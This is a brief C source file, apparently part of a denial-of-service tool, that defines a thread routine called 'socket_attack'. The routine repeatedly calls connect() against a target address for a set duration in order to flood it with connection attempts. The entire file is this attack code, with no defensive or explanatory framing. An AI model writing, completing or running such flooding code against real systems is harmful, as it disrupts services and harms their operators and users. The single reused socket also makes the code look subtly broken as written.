#include "socket_attack.h"

void* socket_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    time_t end_time = time(NULL) + params->duration;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    while (params->active && time(NULL) < end_time) {
        connect(sock, (struct sockaddr*)&(params->target_addr), sizeof(params->target_addr));
    }
    close(sock);
    return NULL;
}
